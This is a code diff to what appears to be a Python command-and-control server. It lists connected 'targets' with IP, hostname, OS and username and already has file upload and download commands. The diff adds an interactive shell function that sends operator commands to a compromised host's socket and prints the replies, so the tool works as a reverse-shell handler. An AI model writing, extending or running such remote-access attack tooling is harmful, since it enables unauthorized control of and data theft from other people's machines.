@@ -21,6 +21,24 @@ server_socket.bind((SERVER_HOST, SERVER_PORT))
 server_socket.listen(5)
 # print(f"Server listening on {SERVER_HOST}:{SERVER_PORT}")
 
+def shell(session):
+
+    conn = connections[session]['socket']
+
+    while True:
+        #Receive data from the target and get user input
+        ans = conn.recv(1024).decode()
+        sys.stdout.write(ans)
+        command = input()
+
+        #Send command
+        command += "\n"
+        conn.send(command.encode())
+        time.sleep(0.5)
+
+        #Remove the output of the "input()" function
+        sys.stdout.write("\033[A" + ans.split("\n")[-1])
+
 def list():
     table = PrettyTable(["ID", "IP", "port", 'Hostname', 'OS', 'Username'])
 
@@ -70,6 +88,8 @@ def use(session):
                     download(from_=command[1], where=command[2], session=session)
                 case 'upload':
                     upload(what=command[1], where=command[2], session=session)
+                case 'shell':
+                    shell(session=session)
                 
     else:
         print("ID does not exist!")
@@ -137,10 +157,6 @@ while 1:
             list()
         case "help":
             help()
-        case  "download":
-            pass
-        case "shell":
-            pass
         case 'exit':
             exit()
             break
